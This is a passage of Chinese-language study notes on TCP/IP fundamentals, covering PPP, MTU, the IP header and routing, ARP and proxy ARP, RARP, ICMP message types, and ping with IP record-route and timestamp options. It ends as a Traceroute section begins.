<p>总的来说，PPP比SLIP具有下面这些优点：</p>
<ul>
<li>PPP支持在单根串行线路上运行多种协议，不只是IP协议；</li>
<li>每一帧都有循环冗余检验；</li>
<li>通信双方可以进行IP地址的动态协商(使用IP网络控制协议)；</li>
<li>与CSLIP类似，对TCP和IP报文首部进行压缩；</li>
<li>链路控制协议可以对多个数据链路选项进行设置。</li>
</ul>
<p>为这些优点付出的代价是在每一帧的首部增加3个字节，当建立链路时要发送几帧协商数据，以及更为复杂的实现。</p>
<h2><span id="环回接口">环回接口</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/151420134957085.png" alt=""></p>
<ul>
<li>传给换回地址（一般是127.0.0.1）任何数据均作为IP输入（都能ping通）</li>
<li>传给广播地址或多播地址报复制一份传给环回接口，然后送给环回接口，然后送到以太网上。这是因为广播传送和多播传送的定义包含主机本身</li>
<li>任何传给该主机IP地址的数据均送到环回接口</li>
</ul>
<h2><span id="mtu和路径mtu">MTU和路径MTU</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/151428393854765.png" alt=""></p>
<ul>
<li>以太网和802.3对数据帧的长度都有一个限制，其最大值分别是1500和1492字节。链路层的这个特征称作MTU，最大传输单元</li>
<li>如果IP层有一个数据报要传，而且数据的长度比链路层的MTU还大，那么IP层就需要进行分片（fragmentation）,把数据报分成若干片，这样每一片都小于MTU</li>
<li>点到点的链路层（如SLIP和PPP）和MTU并非指的是网络媒体的物理特性。相反，它是一个逻辑限制，母的是为交互使用提供足够快的响应时间</li>
<li>两台通信主机路径中的最小MTU。它被称作路径MTU</li>
<li>路径MTU在两个方向上不一定是一致的</li>
<li>MTU是计算出方向的</li>
</ul>
<h2><span id="串行线路吞吐量计算">串行线路吞吐量计算</span></h2><p>如果线路速率是9600b/s，而一个字节有8bit，加上一个起始比特和一个停止比特，那么线路的速率就是960B/s（字节/秒）。以这个速率传输一个1024字节的分组需要1066ms。如果用SLIP链接运行一个交互式应用程序，同时还运行另一个应用程序如FTP发送或接收1024字节的数据，那么一般来说就必须等待一半的时间（533ms）才能把交互式应用程序的分组数据发送出去。</p>
<p>对于交互应用来说，等待533ms是不能接受的。研究表明，交互响应时间超过100~200ms就被认为是不好的，这是发送一份交互报文出去后，直到接收到响应信息（通常是出现一个回显字符）为止的往返时间。</p>
<p>注意：我们对平均等待时间的计算（传输最大数据帧所需时间的一半）只适用于SLIP链路（或PPP链路）在交互通信和大块数据传输这两种情况下。</p>
<h1><span id="ip网际协议">IP：网际协议</span></h1><h2><span id="ip介绍">IP介绍</span></h2><ul>
<li>IP是TCP/IP协议族中最为核心的协议。所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输</li>
<li>IP提供不可靠、无连接的数据报传送服务</li>
<li>不可靠（unreliable）的意思是它不能保证IP数据报能成功到达目的地。IP仅提供最好的传输服务。如果发生某种错误时，如某个路由器暂时用完了缓冲区，IP有一个简单的错误处理算法：丢弃该数据报，然后发送ICMP消息报给信源端。任何要求的可靠性必须由上层来提供（如TCP）</li>
<li>无连接（connectionless）这个术语的意思是IP并不维护任何关于后续数据报的状态信息。每个数据报的处理是互相独立的。IP数据报可以不按发送顺序接收。如果一信源向相同的信宿发送两个连续的数据报（先是A，然后是B），每个数据报都是独立地进行路由选择，课时选择不同的路线，因此B可能在A到达之前先到达。</li>
</ul>
<h2><span id="ip首部">IP首部</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/161409216674369.png" alt=""></p>
<ul>
<li>4个字节的32bit值以下面的次序传输：首先是0~7bit，其次8~15bit，然后16~23bit，最后是24、·31bit。这种传输次序称作big endian字节序。由于TVP|IP首部中所有的二进制整数在网络中传输时都要求以这种次序，因此它又称作网络字节序</li>
<li>目前的协议版本号是4，因此IP有时也称作IPv4</li>
<li>首部长度指的是首部占32bit字的数目，包括任何选项。由于它是一个4bit字段，因此首部最长为60个字节</li>
<li>服务类型（TOS）字段包括一个3bit的优先权子字段（现在已被忽略），4bit的TOS字段和1bit未用位但必须置0</li>
<li>服务类型（TOS）字段包括一个3 bit的优先权子字段（现在已被忽略），4 bit的TOS子字段和1 bit未用位，但必须置0。4 bit的TOS分别代表：最小时延、最大吞吐量、最高可靠性和最小费用。 4 bit中只能置其中1 bit。如果所有4 bit均为0，那么就意味着是一般服务。图3-2列出了对不同应用建议的TOS值。</li>
</ul>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/161438232606801.png" alt=""></p>
<p>注意：现在大多数的TCP/IP实现都不支持TOS特性。</p>
<ul>
<li>总长度字段是指整个IP数据报的长度，以字节为单位。由于该字段长16比特，所以IP数据报最长可达65535字节。<br>注意：尽管可以传送一个长达65535字节的IP数据报，但是大多数的链路层都会对它进行分片。而且，主机也要求不能接收超过576字节的数据报。</li>
<li>标识字段唯一地标识主机发送的每一份数据报。通常每发送一份报文它的值就会加1。</li>
<li>TTL生存时间字段设置了数据报可以经过的最多路由器数。它指定了数据报的生存时间。 TTL的初始值由源主机设置（通常为32或64），一旦经过一个处理它的路由器，它的值就减去1。当该字段的值为0时，数据报就被丢弃，并发送ICMP报文通知源主机。</li>
<li>协议字段，它可以识别是哪个协议向IP传送数据。</li>
<li>首部检验和字段是根据IP首部计算的检验和码。</li>
<li>如果结果不是全1（即检验和错误），那么IP就丢弃收到的数据报。但是不生成差错报文，由上层去发现丢失的数据报并进行重传</li>
<li>由于路由器经常只修改TTL字段（减1），因为当路由器转发一份报文时可以增加它的检验和，而不需要对IP整个首部进行重新计算</li>
<li>任选项，是数据报中的一个可变长的可选信息。这些选项很少被使用，并非所有的主机和路由器都支持这些选项。</li>
</ul>
<h2><span id="ip路由选择">IP路由选择</span></h2><h3><span id="路由表中的包含信息">路由表中的包含信息</span></h3><ul>
<li>目的IP地址。<br>它既可以是一个完整的主机地址，也可以是一个网络地址，由该表目中的标志字段来指定。主机地址有一个非0的主机号，以指定某一特定的主机，而网络地址中的主机号为0，以指定网络中的所有主机（如以太网，令牌环网）。</li>
<li>下一跳路由器的IP地址，或者有直接连接的网络IP地址。<br>下一跳路由器是指一个在直接相连网络上的路由器，通过它可以转发数据报。下一跳路由器不是最终的目的，但是它可以把传送给它的数据报转发到最终目的。</li>
<li>标志。<br>其中一个标志指明目的IP地址是网络地址还是主机地址，另一个标志指明下一跳路由器是否为真正的下一跳路由器，还是一个直接相连的接口。</li>
<li>为数据报的传输指定一个网络接口。</li>
</ul>
<h3><span id="路由选择完成的功能">路由选择完成的功能</span></h3><p>IP路由选择是逐跳地进行的。IP并不知道到达任何目的的完整路径（当然，除了那些与主机直接相连的目的）。所有的IP路由选择只为数据报传输提供下一跳路由器的IP地址。它假定下一跳路由器比发送数据报的主机更接近目的，而且下一跳路由器与该主机是直接相连的。</p>
<ul>
<li>搜索路由表，寻找能与目的IP地址完全匹配的表目（网络号和主机号都要匹配）。如果找到，则把报文发送给该表目指定的下一站路由器或直接连接的网络接口（取决于标志字段的值）。</li>
<li>搜索路由表，寻找能与目的网络号相匹配的表目。如果找到，则把报文发送给该表目指定的下一站路由器或直接连接的网络接口。</li>
<li>搜索路由表，寻找标为“默认”的表目。如果找到，则把报文发送给该表目指定的下一站路由器</li>
</ul>
<h3><span id="实例">实例</span></h3><p><img src="http://news.edu-chn.com/newsadmin/upload_images/1115277097522.JPG" alt=""></p>
<p><img src="http://news.edu-chn.com/newsadmin/upload_images/1115277119522.JPG" alt=""></p>
<p>对于这个例子需要指出一些关键点：</p>
<ul>
<li>该例子中所有主机和路由器都使用了默认路由。事实上，大多数主机和一些路由器可以用默认路由来处理任何目的，除非它在本地局域网上</li>
<li>数据报中的目的IP地址始终不发生任何变化。所有的路由选择决策都是基于这个目的IP地址</li>
<li>每个链路层可能具有不同数据帧首部，而且链路层的目的地址（如果有的话）始终指的是下一站的链路层地址。在例子中，两个以太网封装了含有下一站以太网地址的链路层首部，但是SLIP链路没有这样做。以太网地址一般通过ARP获得。</li>
</ul>
<h2><span id="子网掩码">子网掩码</span></h2><p>任何主机在引导时进行的部分配置是指定主机IP地址。除了此以外，还需要知道有多少比特用于子网号和多少比特用于主机号。这是在引导过程中通过子网掩码来确定的。子网掩码是一个32 bit的值，其中值为1的比特留给网络号和子网号，为0的比特留给主机号。</p>
<p>例如：一个B类地址的两种不同的子网掩码格式。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/171403295891545.png" alt=""></p>
<p>第一个例子，子网号和主机号都是8 bit。第二个例子，子网号是10 bit，主机号是6 bit。</p>
<h2><span id="特殊情况的ip地址">特殊情况的IP地址</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/171404494796569.png" alt=""></p>
<ul>
<li>0表示所有的比特位全为0；-1表示所有的比特位全为1；netid、subnetid和hostid分别表示不为全0或全1的对应字段。子网号栏为空表示该地址没有进行子网划分</li>
<li>表的头两项是特殊的源地址，中间是特殊的环回地址，最后四项是广播地址</li>
<li>表中的头两项，网络号为0，如主机使用BOOTP协议确定本机IP地址时只能作为初始化过程中的源地址出现</li>
</ul>
<h1><span id="arp地址解析协议">ARP：地址解析协议</span></h1><h2><span id="arp介绍">ARP介绍</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/182021092763762.png" alt=""></p>
<ul>
<li>当一台主机把以太网数据帧发送到位于同一局域网上的另一台主机时，是根据48bit的以太网地址来确定目的接口的。设备驱动程序从不检查IP数据报中的目的IP地址</li>
<li>地址解析为这两种不同的地址形式提供映射：32bit的IP地址和数据链路层使用的任何类型的地址（FR环境）</li>
<li>ARP为IP地址到对应的硬件地址之间提供动态映射。我们之所以用动态这个词是因为这个过程是自动完成的，一般应用程序用户或系统管理员不必关心</li>
<li>RARP是被那些没有磁盘驱动器的系统使用（一般是无盘工作站或X终端），它需要系统管理员进行手工设置</li>
</ul>
<h2><span id="一个例子">一个例子</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/182028596987012.png" alt=""></p>
<p>当敲入以下命令时：ftp bsdi（主机名），会发生下列步骤：</p>
<ul>
<li>应用程序FTP客户端调用函数gethostbyname把主机名（bsdi）转换成32 bit的IP地址。这个转换过程或者使用DNS，或者在较小网络中使用一个静态的主机文件（/etc/hosts）。</li>
<li>FTP客户端请求TCP用得到的IP地址建立连接。</li>
<li>TCP发送一个连接请求分段到远端的主机，即用上述IP地址发送一份IP数据报。</li>
<li>如果目的主机在本地网络上（如以太网、令牌环网或点对点链接的另一端），那么IP数据报可以直接送到目的主机上。如果目的主机在一个远程网络上，就通过IP选路函数来确定位于本地网络上的下一站路由器地址，并让它转发IP数据报。</li>
<li>假定是一个以太网，那么发送端主机必须把32 bit的IP地址变换成48 bit的以太网地址。从逻辑Internet地址到对应的物理硬件地址需要进行翻译，这是ARP的功能。</li>
<li>ARP发送一份称作ARP请求的以太网数据帧给以太网上的每个主机，这个过程称作广播。ARP请求数据帧中包含目的主机的IP地址（主机名为bsdi），意思是“如果你是这个IP地址的拥有者，请回答你的硬件地址。”</li>
<li>目的主机的ARP层收到这份广播报文后，识别出这是发送端在寻问它的IP地址，于是发送一个ARP应答。这个ARP应答包含IP地址及对应的硬件地址。</li>
<li>收到ARP应答后，使ARP进行请求-应答交换的IP数据报现在就可以传送了。</li>
<li>发送IP数据报到目的主机。</li>
</ul>
<p>说明：</p>
<ul>
<li>在ARP背后有一个基本概念，就是网络接口有一个硬件地址（一个48 bit的值，标识不同的以太网或令牌环网络接口）。</li>
<li>在硬件层次上进行的数据帧交换必须有正确的接口地址。但是，TCP/IP有自己的地址：32 bit的IP地址。知道主机的IP地址并不能让内核发送一帧数据给主机。内核（如以太网驱动程序）必须知道目的端的硬件地址才能发送数据。</li>
<li>ARP的功能是在32 bit的IP地址和采用不同网络技术的硬件地址之间提供动态映射。</li>
<li>点对点链路不使用ARP。当设置这些链路时（一般在引导过程进行），必须告知内核链路每一端的IP地址。像以太网地址这样的硬件地址并不涉及。</li>
</ul>
<h2><span id="arp背后的一个基本概念">ARP背后的一个基本概念</span></h2><ul>
<li>在ARP背后有一个概念，那就是网络接口有一个硬件地址（一个48bit的值，标识不同的以太网或令牌环网络接口）。在硬件层次上进行的数据帧交换必须有正确的接口地址。但是，TCP|IP有自己的地址：32bit的IP地址。知道主机的IP地址并不能让内核发送一帧数据给主机。内核必须知道目的端的硬件地址才能发送数据。ARP的功能是在32bit的IP地址和采用不同网络技术的硬件地址之间提供动态映射</li>
<li>点对点链路不好使用ARP。当设置这些链路时（一般在引导过程进行），必须告知内核链路每一端IP的地址。像以太网地址这样的硬件地址并不涉及</li>
</ul>
<h2><span id="arp高速缓存">ARP高速缓存</span></h2><ul>
<li>ARP高效运行的关键是由于每个主机上都有一个ARP高速缓存。这个高速缓存存放了最近Intern et地址到硬件地址之间的映射记录。高速缓存中每一项的生存时间一般为20分钟，起始时间从被创建时开始算起。</li>
<li>可用arp命令来检查ARP高速缓存。-a的意思是显示高速缓存中所有的内容。</li>
<li>48 bit的以太网地址用6个十六进制的数来表示，中间以冒号隔开。</li>
</ul>
<h3><span id="pc">PC</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp -a	查看缓存</span><br><span class="line">arp -d  清除缓存</span><br></pre></td></tr></table></figure>
<h3><span id="路由器">路由器</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show arp	查看缓存</span><br><span class="line">clear arp	清除缓存</span><br></pre></td></tr></table></figure>
<h2><span id="arp的分组格式">ARP的分组格式</span></h2><p>在以太网上解析IP地址时，ARP请求和应答分组的格式如图4-3所示（ARP可以用于其他类型的网络，可以解析IP地址以外的地址。紧跟着帧类型字段的前四个字段指定了最后四个字段的类型和长度）</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/182051571674088.png" alt=""></p>
<h3><span id="arp包字段分析">ARP包字段分析</span></h3><ul>
<li>前两个字段是以太网的源地址和目的地址。目的地址为全1的地址是广播地址。电缆上的所有以太网接口都要接收广播的数据帧。</li>
<li>以太网帧类型表示后面数据的类型。对于ARP请求或应答来说，该字段的值为0x0806。</li>
<li>硬件类型字段表示硬件地址的类型。它的值为1即表示以太网地址。</li>
<li>协议类型字段表示要映射的协议地址类型。它的值为0x0800即表示IP地址。</li>
<li>硬件地址长度和协议地址长度分别指出硬件地址和协议地址的长度，以字节为单位。对于以太网上IP地址的ARP请求或应答来说，它们的值分别为6和4。</li>
<li>操作字段指出四种操作类型，它们是ARP请求（值为1）、ARP应答（值为2）、RARP请求（值为 3）和RARP应答（值为4）。</li>
</ul>
<h2><span id="arp代理">ARP代理</span></h2><p>ARP代理通俗地说，就是由中间设备代替其他主机响应arp请求。下图展现了ARP代理工作的主要过程：<br>Proxy ARP应该使用主机没有配置默认网关或没有任何路由策略的网络上</p>
<p><img src="http://www.vants.org/content/plugins/kl_album/upload/201209/98e326f50f0ae0ca8723ba653376c7c020120914093556873290427.png" alt=""></p>
<h3><span id="arp代理工作的过程说明">ARP代理工作的过程说明</span></h3><ul>
<li>192.168.0.16/16主机向外发送目的主机为192.168.1.3/24的ARP请求报文；</li>
<li>网关收到0.16的ARP请求报文，由于网关开启了ARP代理的功能，因此网关代替1.3向0.16发送ARP响应数据报；</li>
<li>网关向1.0/24网段发送1.3的ARP请求报文；</li>
<li>1.3收到后，发送ARP响应报文。</li>
</ul>
<h3><span id="arp代理带来的问题">ARP代理带来的问题</span></h3><p>在开启ARP代理功能之后，很可能会导致地址冲突等类似故障的产生，如在下图的网络环境下，将会产生一系列的不稳定的故障现象产生。 </p>
<p><img src="http://www.vants.org/content/plugins/kl_album/upload/201209/726cb8dcdc4764f2cc1559c89ffde637201209161035261080797373.png" alt=""></p>
<p>   正因为如此，我们在实际工作的环境中对于ARP代理功能的应用需要慎重一些，尽量避免针对整个网段使用ARP代理功能，最好只针对需要使用ARP代理功能来实现某些特殊功能需求的少数IP开启。</p>
<h3><span id="arp代理在实际工作中的应用">ARP代理在实际工作中的应用</span></h3><h4><span id="anyip">AnyIP</span></h4><p>AnyIP是指机器随便使用什么IP地址或网关信息，只要接入网络中都可以实现访问的需求。这个技术被广泛的应用在soho级网关产品中，特别是在宾馆、会议室、广场等公共场所，为网络使用者提供了很大的便利。<br>其工作原理就是利用了ARP代理的功能，在收到非本地IP地址的ARP请求报文时，对其进行ARP响应。这样，那些收到ARP响应的主机就会将相关的数据包发送至网关设备接口处，再由网关设备转发出去，从而实现了上网的功能。   </p>
<h4><span id="网关地址映射">网关地址映射</span></h4><p>在很多网关设备上，都支持将内网的服务器映射为公网地址对外提供服务，以达到隐藏内部网络的目的，这种地址映射也是利用ARP代理技术来实现的，我们来简单看一下下图所示的地址映射的工作过程： </p>
<p><img src="http://www.vants.org/content/plugins/kl_album/upload/201209/d8007e7cdb19d6455234a654b47ab31b2012091409355588821205.png" alt=""></p>
<p>  在这个过程中，当来自互联网的数据访问产生了对映射外网地址202.102.X.2的ARP请求报文，正常情况下，因为这个地址的真实主机并不存在，发送端是不会收到来自202.102.X.2的ARP响应报文的。但是，由于网关上启用了针对202.102.X.2的ARP代理功能，网关会替代202.102.X.2发送ARP响应报文。从而实现了地址映射访问的需求。</p>
<h2><span id="免费arp">免费ARP</span></h2><p>它是指主机发送ARP查找自己的IP地址。通常，它发生在系统引导期间进行接口配置的时候。免费ARP有两个作用：</p>
<ul>
<li>一个主机可以通过它来确定另一个主机是否设置了相同的IP地址。主机bsdi并不希望对此请求有一个回答。但是，如果收到一个回答，那么就会在终端日志上产生一个错误信息“以太网：a:b:c:d:e:f发送来重复的IP地址”。这样就可以警告系统管理员，某个系统有不正确的设置。</li>
<li>如果发送免费ARP的主机正好改变了硬件地址（很可能是主机关机了，并换了一块接口卡，然后重新启动），那么这个分组就可以使其他主机高速缓存中旧的硬件地址进行相应的更新。一个比较著名的ARP协议事实是，如果主机收到某个IP地址ARP请求，而且它已经在接收者的高速缓存中，那么就要用ARP请求中的发送端硬件地址（如以太网地址）对高速缓存中相应的内容进行更新。主机接收到任何ARP请求都要完成这个操作（ARP请求是在网上广播的，因此每次发送ARP请求时网络上的所有主机都要这样做）</li>
<li>通过发送含有备份硬件地址和故障服务器的IP地址的免费ARP请求，使得备份文件服务器可以顺利地接替故障服务器进行工作。这使得所有目的地为故障服务器的报文都被送到备份服务器那里，客户程序不用关心原来的服务器是否出了故障</li>
</ul>
<h1><span id="rarp逆地址解析协议">RARP：逆地址解析协议</span></h1><h2><span id="引言">引言</span></h2><p>具有本地磁盘的系统引导时，一般是从磁盘上的配置文件中读取IP地址。但是无盘机，如X终端或无盘工作站，则需要采用其他方法来获得IP地址。<br>网络上的每个系统都具有唯一的硬件地址，它是由网络接口生产厂家配置的。无盘系统的RARP实现过程是从接口卡上读取唯一的硬件地址，然后发送一份RARP请求（一帧在网络上广播的数据），请求某个主机响应该无盘系统的IP地址（在RARP应答中）。</p>
<h2><span id="rarp的分组格式">RARP的分组格式</span></h2><p>RARP分组的格式与ARP分组基本一致。它们之间主要的差别是RARP请求或应答的帧类型代码为0x8035，且RARP请求的操作代码为3，应答操作代码为4。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/192207023854764.png" alt=""></p>
<p>注意：RARP请求以广播方式传送，应答一般是单播(unicast)传送的。</p>
<h2><span id="rarp服务器的设计">RARP服务器的设计</span></h2><p>RARP在概念上很简单，但是一个RARP服务器的设计与系统相关而且比较复杂。相反，提供一个ARP服务器很简单，通常是TCP/IP在内核中实现的一部分。由于内核知道IP地址和硬件地址，因此当它收到一个询问IP地址的ARP请求时，只需用相应的硬件地址来提供应答就可以了。</p>
<h3><span id="作为用户进程的rarp服务器">作为用户进程的RARP服务器</span></h3><p>RARP服务器的复杂性在于：</p>
<ul>
<li>服务器一般要为多个主机（网络上所有的无盘系统）提供硬件地址到IP地址的映射，该映射包含在一个磁盘文件中。由于内核一般不读取和分析磁盘文件，因此RARP服务器的功能就由用户进程来提供，而不是作为内核的TCP/IP实现的一部分。</li>
<li>RARP请求是作为一个特殊类型的以太网数据帧来传送的（帧类型字段值为0x8035），说明RARP服务器必须能够发送和接收这种类型的以太网数据帧。</li>
</ul>
<h3><span id="每个网络有多个rarp服务器">每个网络有多个RARP服务器</span></h3><p>RARP服务器实现的一个复杂因素是RARP请求是在硬件层上进行广播的，这意味着它们不经过路由器进行转发。为了让无盘系统在RARP服务器关机的状态下也能引导，通常在一个网络上（例如一根电缆）要提供多个RARP服务器。<br>当服务器的数目增加时（以提供冗余备份），网络流量也随之增加，因为每个服务器对每个RARP请求都要发送RARP应答。发送RARP请求的无盘系统一般采用最先收到的RARP应答。（对于ARP，只有一台主机发送ARP应答）。每个RARP服务器同时应答，这样会增加以太网发生冲突的概率。</p>
<h1><span id="icmpinternet控制报文协议">ICMP：Internet控制报文协议</span></h1><h2><span id="icmp介绍">ICMP介绍</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/201851308717804.png" alt=""><br><img src="http://images.cnitblog.com/blog2015/697266/201504/201854533243954.png" alt=""></p>
<ul>
<li>ICMP经常被认为是IP层的一个组成部分。它传递差错报文以及其他需要注意的信息。ICMP报文通常被IP层或更高层协议（TCO或UDP）使用。一些ICMP报文把差错报文返回给用户进程</li>
<li>ICMP报文是在IP数据内部被传输的</li>
<li>ICMP报文的格式如图6-2所示。所有报文的前4个字节都是一样的，但是剩下的其他字节则互不相同</li>
<li>类型字段可以有15个不同的值，以描述特定类型的ICMP报文。某些ICMP报文还使用代码字段的值来进一步描述不同的条件</li>
<li>检验和字段覆盖整个ICMP报文。使用的算法与IP首部检验和算法相同。ICMP的检验和是必须的</li>
</ul>
<h2><span id="icmp报文的类型">ICMP报文的类型</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/201900206052867.png" alt=""></p>
<ul>
<li>不同类型由报文中的类型字段和代码字段来共同决定。</li>
<li>ICMP是一份查询报文还是一份差错报文。</li>
<li>因为对ICMP差错报文有时需要作特殊处理，因此需要对它们进行区分。例如，在对ICMP差错报文进行响应时，永远不会生成另一份ICMP差错报文（如果没有这个限制规则，可能会遇到一个差错产生另一个差错的情况，而差错再产生差错，这样会无休止地循环下去）。</li>
<li>当发送一份ICMP差错报文时，报文始终包含IP的首部和产生ICMP差错报文的IP数据报的前8个字节。这样，接收ICMP差错报文的模块就会把它与某个特定的协议（根据IP数据报首部中的协议字段来判断）和用户进程（根据包含在IP数据报前8个字节中的TCP或UDP报文首部中的TCP或UDP端口号来判断）联系起来。</li>
</ul>
<h3><span id="下面各种情况都不会导致产生icmp差错报文">下面各种情况都不会导致产生ICMP差错报文</span></h3><ul>
<li>ICMP差错报文（ICMP查询报文可能会产生ICMP差错报文）。</li>
<li>目的地址是广播地址或多播地址的IP数据报。</li>
<li>作为链路层广播的数据报。</li>
<li>不是IP分片的第一片。</li>
<li>源地址不是单个主机的数据报。即源地址不能为零地址、环回地址、广播地址或多播地址。</li>
</ul>
<p>这些规则是为了防止过去允许ICMP差错报文对广播分组响应所带来的广播风暴。</p>
<h2><span id="icmp地址掩码请求与应答">ICMP地址掩码请求与应答</span></h2><p>ICMP地址掩码请求用于无盘系统在引导过程中获取自己的子网掩码。系统广播它的ICMP请求报文，报文格式如图6-4所示：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/201922374028201.png" alt=""></p>
<p>说明：</p>
<ul>
<li>标识符和序列号字段由发送端任意选择设定，这些值在应答中将被返回。这样，发送端就可以把应答与请求进行匹配。</li>
<li>广播的定义是指局域网上的所有主机，因此它必须包括发送主机在内。当以太网驱动程序识别出目的地址是广播地址后，它就把分组送到网络上，同时传一份拷贝到环回接口。</li>
<li>通常，应答地址必须是单播地址，除非请求端的源IP地址是0.0.0.0。</li>
</ul>
<h3><span id="icmp时间戳请求与应答">ICMP时间戳请求与应答</span></h3><p>ICMP时间戳请求允许系统向另一个系统查询当前的时间。返回的建议值是自午夜开始计算的毫秒数，协调的统一时间(Coordinated Universal Time, UTC)。</p>
<p>说明：</p>
<ul>
<li>这种报文的好处是：提供了毫秒级的分辨率，而利用其他方法从别的主机获取的时间（如某些Unix系统提供的rdate命令）只能提供秒级的分辨率。</li>
<li>缺陷是：返回的时间是从午夜开始计算的，因此调用者必须通过其他方法获知当时的日期。</li>
</ul>
<p>ICMP时间戳请求和应答报文格式如图6-6所示：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/201955518555818.png" alt=""></p>
<p>请求端填写发起时间戳，然后发送报文。应答系统收到请求报文时填写接收时间戳，在发送应答时填写发送时间戳。</p>
<h2><span id="icmp端口不可达差错">ICMP端口不可达差错</span></h2><p>端口不可达报文是一种ICMP差错报文，它是ICMP目的不可到达报文中的一种。ICMP不可达报文的一般格式如图6-10所示。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/202037158396912.png" alt=""></p>
<p>说明：</p>
<ul>
<li>ICMP的一个规则是：ICMP差错报文必须包括生成该差错报文的数据报IP首部（包含任何选项），还必须至少包括跟在该IP首部后面的前8个字节。</li>
<li>导致差错的数据报中的IP首部要被送回的原因是因为IP首部中包含了协议字段，使得ICMP可以知道如何解释后面的8个字节。TCP和UDP首部的前8个字节包括源端口和目的端口。</li>
</ul>
<p>ICMP覆盖的范围很广，从致命差错到信息差错，即使在一个给定的系统实现中，对每个ICMP报文的处理都是不相同的。</p>
<h2><span id="icmp报文的44bsd处理">ICMP报文的4.4BSD处理</span></h2><p>由于ICMP覆盖的范围很广，从致命差错到信息差错，因此即使在一个给定的系统实现中，对每个ICMP报文的处理都是不相同的。<br><img src="http://img.blog.csdn.net/20150414163431439" alt=""></p>
<ul>
<li>如果最后一列标明是“内核”，那么ICMP就由内核来处理</li>
<li>如果最后一列指明是“用户进程”，那么报文就被传送到所有在内核中登记用户进程，以读取收到的ICMP报文</li>
<li>如果不存在任何这样的用户进程，那么报文就悄悄地被丢弃（这些用户进程还会收到所有其它类型的ICMP报文的拷贝，虽然它们应该由内核来处理，当然用户进程只有在内核处理以后才能收到这些报文）。有一些报文完全被忽略</li>
<li>如果最后一列标明的是引号内的一串字符，那么它就是对应的Unix差错。</li>
</ul>
<h1><span id="ping程序">Ping程序</span></h1><h2><span id="ping介绍">Ping介绍</span></h2><ul>
<li>“ping”这个名字源于声纳定位操作。Ping程序由Mike Muuss编写，目的是为了测试另一台主机是否可达。该程序发送一份ICMP回显请求报文给主机，并等待返回ICMP回显应答</li>
<li>可以用Ping程序来确定问题出在哪里。Ping程序还能测出到这台主机的往返时间，以表明该主机离我们有多远</li>
<li>一台主机的可达性可能不只取决于IP层是否可达，还取决于使用何种协议以及端口号。Ping程序的运行结果可能显示某台主机不可达，但我们可以用Telnet远程登录到该台主机是25号端口</li>
</ul>
<h2><span id="ping程序">Ping程序</span></h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/uknow4.jpg" alt=""></p>
<ul>
<li>称发送回显请求的ping程序为客户，而称被ping的主机为服务器。大多数的TCP|IP实现都在内核中直接支持Ping服务器–这种服务器不是一个用户进程</li>
<li>对于其他类型的ICMP查询报文，服务器应该响应标识符和序列号字段。另外，客户发送的选项数据必须回显，假设客户对这些信息都会感兴趣</li>
<li>Unix系统在实现ping程序时是把ICMP报文中的标识符字段置成发送进程的ID号。这样即使在同一台主机上同时运行了多个ping程序实例，ping程序也可以识别出返回的信息</li>
<li>在windows下，不管开多个窗口ping的identifier都是相同的，而且每增加一个出去的ping包序列号增加256</li>
</ul>
<h2><span id="ip记录路由选项">IP记录路由选项</span></h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/uknow5.jpg" alt=""></p>
<ul>
<li>大多数不同版本的ping程序都提供-R选项，以提供记录路由的功能。它使得[ing程序在发送出来的IP数据报中设置IPRR选项（该IP数据报包含ICMP回显请求报文）。这样，每个处理该数据报的路由器都把它的IP地址放入选项字段中。当数据报到达目的端时，IP地址清单应该赋值到ICMP回显应答中，这样返回途中所经过的路由器地址也被加入清单中。当Ping程序收到回显应答时，它就打印出这份IP地址清单</li>
<li>源端主机生成RR选项，中间路由器对RR选项的处理，以及把ICMP回显请求中的RR清单复制到ICMP回显应答中，所有这些都是选项功能。幸运的是，现在的大多数系统都支持这些选项功能，只能有一些系统不把ICMP请求的IP清单赋值到ICMP应答中。</li>
<li>但是，最大的问题是IP首部中只有有限的空间来存放IP地址。IP首部中的首部长度字段只有4bit，因此整个IP首部最长只能包括15个32bit长的字（即60个字节）。由于IP首部固定长度为20字节，RRR选项用去3个字节，这样只剩下37个字节（60-20-3）来存放IP地址清单，也就是说只能存放9个IP地址</li>
</ul>
<h2><span id="ip时间戳选项">IP时间戳选项</span></h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/uknow3.jpg" alt=""></p>
<ul>
<li>时间戳选项的代码为0x44。其他两个字段len和ptr与记录路由选项相同：选项的总长度（一般为36或40）和指向下一个可用时间的指针（5，9，13等）</li>
<li>接下来的两个字段是4bit的值：OF表示溢出字段，FL表示标志字段。时间戳选项的操作</li>
<li>时间戳的取值一般为自UTC午夜开始计的毫秒数，与ICMP时间戳请求和应答相类似。如果路由器不使用这种格式，它就可以插入任何它使用的时间表示格式，但是必须打开时间戳中的高位以表明为非标准值</li>
<li>与我们遇到的记录路由选项所受到的限制相比，时间戳选项遇到情况要更坏一些。如果我们要同时记录IP地址和时间戳（标志位为1），那么就可以同时存入其中的四对值。只记录时间戳是没有用处的，因为没有标明时间戳与路由器之间的对应关系</li>
</ul>
<h1><span id="traceroute程序">Traceroute程序</span></h1><ul>
<li>由Van Jacobson编写的Traceroute程序是一个能更深入探索TCP|IP协议的方便可用的工具</li>
